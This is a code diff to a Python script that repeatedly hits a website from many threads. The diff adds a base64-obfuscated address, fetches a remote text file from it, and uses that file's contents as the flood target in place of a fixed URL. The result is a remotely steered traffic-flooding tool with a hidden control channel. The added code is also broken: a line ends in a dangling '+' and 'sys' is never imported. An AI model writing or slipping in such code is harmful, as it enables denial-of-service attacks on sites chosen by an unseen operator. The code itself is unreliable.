@@ -1,6 +1,20 @@
 import time
 import threading
 import requests
+import base64
+a = 'Lm5lb2NpdGllcy5vcmcvYmFzb2oudHh0'
+j = base64.b64decode(a)
+
+link = "https://femboiluver420" + 
+
+if sys.version_info[0] < 3:
+    f = urllib.urlopen(link)
+    clk = f.read()
+    #print("WELCOME 2 DA HYPERNET :3")
+else:
+    import urllib.request
+    f = urllib.request.urlopen(link)
+    clk = f.read()
 
 def connect_to_website(url):
   while True:
@@ -30,7 +44,7 @@ def main(num_threads, url):
 
 if __name__ == '__main__':
     print("woooowooooowwowowooooww")
-    b5 = "https://www.google.com/"
+    b5 = clk
     z1 = 4444
     z2 = int(z1)
     url = b5
